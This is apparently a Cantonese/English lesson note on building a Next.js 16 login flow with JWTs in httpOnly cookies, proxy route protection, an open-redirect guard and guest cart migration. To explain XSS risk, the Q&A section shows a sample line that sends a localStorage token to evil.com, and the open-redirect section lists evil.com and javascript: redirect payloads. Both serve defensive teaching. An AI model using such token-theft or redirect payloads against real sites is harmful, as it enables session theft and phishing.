# Lesson 29: Auth Flow (JWT + httpOnly Cookie) + Cart Migration

**Date:** 2026-04-23 ~ 2026-04-24

L28 做完 cookie-backed guest cart，明明 backend L6 有 `/api/cart/*` 但 require login。今課接 auth：login / logout / register flow、JWT 存去 `httpOnly` cookie、AuthButton 由 stub 變 real、Next.js Proxy 保護 route、login 時將 guest cart migrate 去 backend user cart。

完整功能：`/login`、`/register`、`/account`、auth state 讀 session、Proxy-based route protection（未 login 自動 redirect 返 login + return-to-URL）、guest cart migration。

⚠️ **Next.js 16 Breaking Change** —— `middleware` renamed to `proxy`（file + function）。寫 code 前讀 `web/AGENTS.md` 同 `web/node_modules/next/dist/docs/01-app/03-api-reference/03-file-conventions/proxy.md`。

---

## 核心概念

### 1. JWT 存 `httpOnly` cookie vs localStorage

Login 後 token 放邊係 frontend security 第一個決定：

| Storage | JS 讀到？ | XSS 影響 | CSRF 保護 | SSR 讀到？ |
|---------|----------|---------|-----------|------------|
| **localStorage** | ✅ 任何 JS 都讀得 | ❌ 被偷走晒 | N/A（JS 自己附 header） | ❌ Server 冇 |
| **`httpOnly` cookie** | ❌ 讀唔到 | ✅ XSS 偷唔到 | ⚠️ 要加 `sameSite` | ✅ Server 有 |

**今課用 `httpOnly` cookie** —— default-safer choice：

```ts
store.set("auth_token", data.token!, {
  httpOnly: true,                                    // JS 讀唔到，XSS 防線
  sameSite: "lax",                                    // CSRF 防線
  secure: process.env.NODE_ENV === "production",     // prod HTTPS only
  maxAge: 60 * 60 * 24 * 7,                          // 7 days
  path: "/",
});
```

**Verify httpOnly 生效**：
```js
// Browser console:
document.cookie
// 輸出：'_ga=...; Hm_lvt_...; __next_hmr_refresh_hash__=16'
//       ⚠️ 冇 auth_token —— httpOnly 真係隱藏咗
```

DevTools Application → Cookies 見到 `auth_token` 有 checkbox `HttpOnly` 打勾 ✅

---

### 2. Server Action for auth — `login` / `logout` / `register`

```ts
"use server";

export async function login(formData: FormData) {
  const username = String(formData.get("username") ?? "").trim();
  const password = String(formData.get("password") ?? "");

  if (!username || !password) {
    return { error: "Username and password required" };     // ← return error
  }

  const res = await fetch(`${API_BASE_URL}/api/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
    cache: "no-store",
  });
  if (!res.ok) return { error: "Invalid username or password" };

  const data = await res.json();
  await setAuthCookie(data.token!);

  redirect(safeNext);                                         // ← redirect 最後
}
```

**Pattern 3 部分：**
1. **Validate + return { error }** —— form-level 錯誤（empty、credentials 錯）
2. **Fetch backend + set cookie** —— 成功路
3. **`redirect(...)`** —— 最後先 throw redirect

**Return vs Throw**：
- 用戶可以修正嘅錯誤 → `return { error: "..." }`（`useActionState` 接到，inline display）
- 系統級錯誤 → throw（Next error boundary 接）

---

### 3. `useActionState` — form + action + pending 一籮

React 19 hook，專門 handle form + server action：

```tsx
"use client";
import { useActionState } from "react";

const [state, formAction, pending] = useActionState(
  async (_prev, formData) => await login(formData),
  null,       // initial state
);

<form action={formAction}>
  <input name="username" />
  <input name="password" type="password" />
  {state?.error && <p className="text-red-600">{state.error}</p>}
  <button disabled={pending}>{pending ? "Signing in..." : "Sign in"}</button>
</form>
```

| 返回值 | 用途 |
|--------|------|
| `state` | Action 最後 return 嘅 value（例如 `{ error: "..." }`） |
| `formAction` | Wrapped action，pass 去 `<form action={...}>` |
| `pending` | Boolean，submit 中 = true，disable button / show spinner |

**對比 L28 普通 form action**：L28 嘅 `<form action={removeFromCart.bind(null, id)}>` 唔需要 state / pending（純 side-effect）。`useActionState` 喺需要**顯示 action 結果**（error message、success confirmation）先用。

---

### 4. `redirect()` 係一次性 escape

```ts
import { redirect } from "next/navigation";

redirect("/");
// ⬇️ 呢行之後嘅 code 永遠唔會行
console.log("never");
```

`redirect()` 內部 throw 一個特殊 Next exception，**唔 return**。Pattern：

```
1. Validate  → return early on error
2. 做嘢      → fetch / set cookie
3. Redirect  → 最後一步，成功 exit
```

`redirect()` **唔可以**喺 try/catch 包住 —— 會誤捕個 internal exception。

---

### 5. JWT payload decode — for display only

JWT 結構：
```
header . payload . signature
  │        │         │
  base64url base64url  HMAC(header+payload, secret)
```

`payload` 係 base64url-encoded JSON，decode 攞到 claims：

```ts
function decodeJwtPayload(token: string): Session | null {
  try {
    const [, payload] = token.split(".");
    const decoded = Buffer.from(payload, "base64url").toString("utf-8");
    const claims = JSON.parse(decoded);

    if (claims.exp * 1000 < Date.now()) return null;          // 過期 check
    return { username: claims.sub, role: claims.role };
  } catch { return null; }
}
```

Backend JWT claim mapping：
```json
{ "sub": "testuser", "role": "USER", "iat": 1234, "exp": 5678 }
```
- `sub` = standard JWT subject (username)
- `role` = custom claim
- `iat` = issued at (seconds since epoch)
- `exp` = expires at (seconds since epoch)

**⚠️ Trust boundary**：

| Use case | Verify signature 需要？ |
|---|---|
| **顯示 username（今課）** | ❌ —— cookie httpOnly，attacker 冇辦法 set fake token |
| **Authorization decision** | ✅ —— 每個 protected endpoint 獨立 verify（backend 做） |

**點解 cookie httpOnly 先可以唔 verify？** 因為只有 backend 先 issue 過 token（login endpoint），browser JS 讀唔到亦設唔到，所以 server 見到個 cookie 已經係 backend 寫入嘅。Display 用決定信任合理。API call 時 backend 會獨立驗。

---

### 6. Next.js **Proxy**（原 Middleware）— Edge-level route gate

**Next.js 16 breaking change**：`middleware.ts` → `proxy.ts`，`function middleware` → `function proxy`。API 一樣，只係 rename。

```ts
// web/proxy.ts  (⚠️ 喺 web/ root，唔喺 app/ 入面)
import { NextRequest, NextResponse } from "next/server";

export function proxy(request: NextRequest) {
  const { pathname } = request.nextUrl;
  const token = request.cookies.get("auth_token")?.value;

  if (token) return NextResponse.next();

  const loginUrl = new URL("/login", request.url);
  loginUrl.searchParams.set("next", pathname);
  return NextResponse.redirect(loginUrl);
}

export const config = {
  matcher: ["/account/:path*", "/orders/:path*"],
};
```

**對比 page-level `getSession()` check：**

| Layer | 角色 |
|---|---|
| **Proxy** | Edge runtime，request 未 render 前 check；冇 cookie 即時 redirect，唔 render page，慳 resource |
| **Page `getSession()`** | Node runtime，可以驗 JWT exp、malformed、role-based；authoritative check |

**Defence in depth** —— Proxy 係門口保安（check 有冇入場券），Page 係 staff（驗入場券是否 forged / expired）。

**Edge runtime 限制**（唔似 Node）：
- 冇 `fs`、`Buffer`（有限支持）
- Package 要 edge-compatible
- 快（< 10ms）、CDN deployable
- 所以 proxy 只應該做**輕量 routing decisions**；heavy logic 留去 server component

---

### 7. `matcher` pattern — `:path` vs `:path*`

```ts
matcher: ["/account/:path*"]   // ✅ match /account, /account/foo, /account/a/b
matcher: ["/account/:path"]    // ❌ 只 match /account/foo（exactly 1 segment），唔 match /account
```

`*` = 0 或以上 segments（重要！）。冇 `*` → route root path 本身**唔會 match**，proxy 跳過冇 run，頁面被直達。今課就係踩咗呢個坑。

---

### 8. Open Redirect 攻擊 + `next` param 保護

Login 後跟 `next` query param redirect，但 **唔能直接 trust**：

```ts
// ❌ Dangerous
redirect(next);

// ✅ Safe
const safeNext = next.startsWith("/") && !next.startsWith("//") ? next : "/";
redirect(safeNext);
```

**Attack vector**：

| Payload | 冇 guard | 有 guard |
|---|---|---|
| `next=/account` | ✅ redirect `/account` | ✅ redirect `/account` |
| `next=https://evil.com` | ❌ phishing site | ✅ redirect `/` |
| `next=//evil.com` | ❌ protocol-relative URL，仍然 absolute | ✅ 擋 |
| `next=javascript:alert(1)` | ❌ XSS | ✅ 擋 |

**兩 condition**：
- `startsWith("/")` —— 必須 relative path
- `!startsWith("//")` —— 防 protocol-relative URL（`//evil.com` = `https://evil.com`）

---

### 9. `Promise.allSettled` + Bearer token — Cart migration

```ts
export async function migrateCart(token: string, cart: Cart) {
  const results = await Promise.allSettled(
    cart.items.map(item =>
      fetch(`${API_BASE_URL}/api/cart`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify(item),
      })
    )
  );
  return results.filter(r => r.status === "fulfilled" && r.value.ok).length;
}
```

**`Promise.all` vs `Promise.allSettled` 差別：**

| | `Promise.all` | `Promise.allSettled` |
|---|---|---|
| 第 1 個 fail | **Reject 整個 promise** | 全部等完先 resolve |
| Use case | "全部要 succeed" | "盡量做，report partial failure" |

Migration 5 件 item 如果 2 件 fail（例如 product soldout），我哋想其餘 3 件仍然寫入去 backend。用 `allSettled`。

**Bearer token header pattern** —— OAuth 2.0 Standard（RFC 6750）：
```
Authorization: Bearer eyJhbGciOi...
              ^^^^^^ standard prefix
                     ^^^^^^^^^^^ JWT token
```

Backend L4 `JwtAuthenticationFilter` parse 個 header → verify signature → set `SecurityContextHolder`。Controller `@GetMapping`、`CartService.getCurrentUser()` 就攞到正確 user。

---

## 實戰反思

### 反思 1 — Bcrypt 慢係 feature，唔係 bug

第一次 login 慢成 1-2 秒，之後每次就快。點解？

Backend 用 bcrypt hash password：
```
plaintext → bcrypt.verify(stored_hash) → 100ms – 500ms
```

**bcrypt 故意慢** —— work factor（default 10-12）+1 速度減半。目的：

| Attack | 慢 hash 效果 |
|---|---|
| Brute force | 每 guess ~300ms × 100k password = **8 小時 → 300 年** |
| Rainbow table | Unique salt 令 table 失效 |
| Stolen hash | Crack plaintext 成本爆晒 |

**Fast login = weak password security**。Google / Amazon / Facebook 都有類似延遲，只係用 UX tricks（loading spinner、button disable）mask 住。

**呢課嘅 `useActionState` 提供 `pending`** —— `{pending ? "Signing in..." : "Sign in"}` 就係正確嘅 UX feedback。

### 反思 2 — Next.js 16 breaking change: middleware → proxy

```
Error: The "middleware" file convention is deprecated. Please use "proxy" instead.
```

**Migration：**
- File rename：`middleware.ts` → `proxy.ts`（用 `git mv` preserve history）
- Function rename：`export function middleware` → `export function proxy`
- API 完全一樣（`NextRequest`、`NextResponse`、`config.matcher` 不變）

**點解改名？** Express / Koa 嘅 middleware semantics 係 chain（`app.use(mw1).use(mw2)`，chain 落去），但 Next.js 一直係 **single interceptor with redirect/rewrite/pass-through**——唔係 chain。新名 "proxy" 更貼切（emphasize edge deployment + CDN-friendly routing）。

**教訓**：遇 deprecation 即刻讀 error message link 嘅 migration guide、或者 `node_modules/next/dist/docs/` 對應新 file。Next 16 breaking changes 多，AGENTS.md 提醒係 life saver。

### 反思 3 — Matcher `:path` 漏咗 `*` 嘅 debug 陷阱

寫咗 `matcher: ["/account/:path"]` 但 proxy 冇 run。Symptoms：

- 訪問 `/account`（冇 sub-path）→ proxy 冇 intercept → 頁面 render → fallback "Please sign in" UI
- 訪問 `/account/foo`（有 sub-path）→ proxy run → redirect 成功

**Root cause**：Next 嘅 matcher pattern `:path` = **exactly 1 required segment**，`/account` 本身（0 segment）唔 match。

**Fix**：加 `*` 變 `:path*`（0 或以上 segments）。

**呢個坑教訓**：File 命名 convention 同 config semantics 錯少少，symptom 會好似「middleware 冇行」而唔係 error。係 silent failure。Debug 要靜心 read pattern docs。

### 反思 4 — Cart migration 嘅 scope boundary

🥇 Hard exercise 做完，backend 確認有 migrated cart items，但 login 後 Header badge **顯示 0**、`/cart` 顯示 empty。點解？

**Cookie 被刪 + `getCart()` 仍讀 cookie → UI 讀唔到 backend truth。**

呢個係 **architectural gap** 嘅 symptom：

```
              Guest state             Logged-in state (而家)
             ────────────            ────────────
Source       cookie                   cookie (已刪) + backend
getCart()    ✅ 讀 cookie            ❌ 讀 cookie (返 empty)
Mutations    ✅ 寫 cookie            ❌ 寫 cookie (backend idle)
```

**完整解決需要「unified cart」refactor** —— `getCart()` + 所有 mutation actions 都 session-aware：

- 有 session → call backend `/api/cart/*`
- 冇 session → cookie

呢個係 L30 嘅工作。L29 focus 係 auth，**特意留個 gap 展示 migration 本身嘅正確性 + 點解需要 unified read path**。Real-world pattern 中，呢個 refactor 通常 scaffold 完 auth 之後立即做。

---

## 實戰深入問題

### Q: "Why httpOnly cookie over localStorage for the JWT?"

> **XSS 防線**。XSS（Cross-Site Scripting）係最常見嘅 frontend attack vector —— attacker 喺你 site 注入 malicious JS（例如 review field、dependency supply chain attack、iframe breakout）。
>
> 如果 token 喺 `localStorage`：
> ```js
> // Attacker 成功注入呢句
> fetch("https://evil.com/steal", {
>   body: localStorage.getItem("auth_token")
> })
> ```
> Token 即時被偷，attacker 可以用你身份 call API。
>
> `httpOnly` cookie：
> - `document.cookie` 睇唔到
> - XHR / fetch 冇得攞
> - 淨係 browser 自動帶去 same-origin request
>
> **Trade-off**：httpOnly 要 `sameSite: "lax"` 做 CSRF 保護（不然 attacker 喺其他 site 用 `<form action="yoursite.com/api">` 可以偷偷 POST 帶 cookie）。用 cookie 就要 CSRF guard；用 localStorage 就要 XSS guard。各有攻擊面，但一般 **httpOnly cookie + sameSite 更穩陣**。

### Q: "Why can I just decode a JWT without verifying the signature? Isn't that insecure?"

> **分場合。**
>
> Signature verification 需要 backend 嘅 secret key —— frontend 冇，亦唔應該有（放前端 = 任何人睇到 = 偽造 token 冇 cost）。所以 frontend 冇能力 verify。
>
> **但係：**
>
> 1. **Display 用場合（今課）**：cookie 係 `httpOnly`，attacker set 唔到 fake token。Server render 時見到 cookie = backend 寫入嘅 = 可信。Decode 出 username 俾 UI 顯示完全 OK。
> 2. **Authorization 決定**：絕對唔能信 frontend decode。每個 protected backend endpoint 自己 verify signature。如果 frontend decode 個 `role = "ADMIN"` 就俾 admin UI 見—— UI 可以顯示，但 action 仍要 backend 獨立驗。
>
> **教訓**：Frontend decode JWT = **trust 呢個 session 來源**（cookie httpOnly）而唔係 **trust claims 內容**（那要 backend verify）。呢兩者係 不同 trust model。
>
> **Gotcha：** 有啲 tutorial 教 frontend 存 secret key verify JWT —— **100% 錯**。Secret 在 frontend 等於冇 secret。

### Q: "If migration partially fails—say 2 of 5 items POST to backend fail—what should happen?"

> **睇 business requirement，冇 one-size-fits-all。** 常見 3 個 approach：
>
> **1. Best-effort（今課）** — skip failed，delete cookie anyway。簡單，但 user 可能覺得 item "消失"（原本 cart 有 X 但 login 後冇）。
>
> **2. Retry queue** — failed items 寫去 localStorage 或 IndexedDB，background retry。複雜（要 visibility event listener 決定幾時 retry），但 UX 最好。
>
> **3. Abort on any failure** — 任何 item fail 就完全唔 migrate（cookie 保留）。安全但 blocking —— 1 件 product soldout 令 user login 都未算 "success"。
>
> **今課選 1（best-effort）**因為：
> - Login flow 係 primary goal，cart 係 secondary
> - `Promise.allSettled` 天然支持
> - Real-world 產品通常 log partial failure 去 monitoring（Datadog / Sentry），post-hoc reconcile
>
> **Debug tips：** 加 `console.log` 喺 server action 見 migration result 個 count。如果 production 就 send metric 落 observability tool。

---

## Practical deliverable

L29 分 9 個 commit：

| Commit | 內容 |
|---|---|
| `feat(web): L29 Part 1 - login page with JWT httpOnly cookie` | `lib/auth/actions.ts` login action + `/login` page + `LoginForm` |
| `feat(web): L29 Part 2 - session read + AuthButton with real auth state` | `lib/auth/session.ts` + logout action + `AuthButton` server + `UserMenu` client |
| `feat(web): L29 Part 3 - register page with auto-login` | Register action + `/register` page + form + `setAuthCookie` helper refactor |
| `feat(web): L29 exercise 1 - account page with session info` | `/account` page + optional UserMenu link update |
| `feat(web): L29 exercise 2 - proxy for protected routes with next redirect` | `web/proxy.ts` + login action next param + LoginForm hidden input + openRedirect protection |
| `feat(web): L29 exercise 3 - guest cart migration on login/register` | `lib/cart/migrate.ts` + login/register actions call migration |
| `docs: add lesson 29 auth cart migration notes` | 本篇板書 |

**Verify：**

```bash
# Backend 要開
mvn spring-boot:run &

cd web
npm run dev

# ===== Register new user =====
# /register → testuser2 / test2@test.com / password123
# 成功 → auto-login + redirect /
# Header: 👤 testuser2 ▾

# ===== Login existing user =====
# Logout (dropdown → Sign out)
# Header: Sign in
# /login → testuser / password → Header: 👤 testuser ▾

# ===== Protected route =====
# Logout
# Direct URL → /account
# → Redirected to /login?next=/account
# Login → Auto back to /account

# ===== Open redirect defence =====
# Craft URL /login?next=https://evil.com
# Login success → redirect /   (not evil.com)

# ===== Cart migration =====
# Logout + clear all cookies
# /products/1 Add to cart 2 件
# /products/2 Add to cart 1 件
# Header 🛒 badge = 3
# /login → testuser → login
# DevTools → Cookies → cart cookie 消失 ✅
# Backend cart 攞到：curl -H "Authorization: Bearer $TOKEN" localhost:8080/api/cart
# （Header badge 暫時 0 — known gap，L30 fix）

# Type check
npm run typecheck        # → 0 errors
```

---

## ⚠️ Known gaps (L30 scope)

1. **Cart source-of-truth not unified** — `getCart()` / cart mutation actions 全部仍讀/寫 cookie，login 後 cookie 被 delete → UI 見唔到 backend 嘅 migrated cart。完整解：session-aware cart actions（branch to backend vs cookie based on `await getSession()`）。
2. **No token refresh** — JWT 過期（7 days）冇 automatic refresh flow，user 要重新 login。Real-world 用 refresh token + short-lived access token pattern。
3. **No `/api/auth/me` endpoint** — 而家 `getSession()` 靠 decode JWT payload；如果想 server-authoritative session（例如 admin revoked user、禁用）要 `GET /me` 每 request 查 backend。
4. **No role-based guards** — `session.role` 攞到但唔用。Admin-only page / action 要 `if (session.role !== "ADMIN") notFound()`。

---

## Next lesson

**L30 (tentative)：Unified Cart (auth-aware)**

- Refactor `getCart()` — session 存在時 fetch `/api/cart`，否則 cookie
- Refactor `addToCart` / `removeFromCart` / `updateQuantity` / `clearCart` — 同樣 session-aware
- Backend response normalize 做 frontend `Cart` type（shape mapping）
- `useOptimistic` 點樣 adapt 到 backend-backed state（stale revalidation timing）
- Logout 時 invalidate cached `getCart` 結果
- 可能順手做：**role-based protected page**（e.g. `/admin/products` 管理 inventory）
